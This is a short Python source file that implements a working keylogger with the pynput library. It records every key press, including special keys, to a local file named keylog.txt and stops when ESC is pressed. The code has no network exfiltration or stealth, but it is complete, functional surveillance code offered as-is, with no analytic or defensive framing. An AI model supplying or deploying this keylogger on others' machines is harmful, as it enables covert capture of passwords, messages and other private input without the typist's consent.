from pynput import keyboard

# File where keystrokes will be saved
log_file = "keylog.txt"

# Function runs every time a key is pressed
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")   # normal characters
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")    # special keys like ENTER, SHIFT etc.

# Function runs when a key is released
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when ESC is pressed
        return False

# Main function to start keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
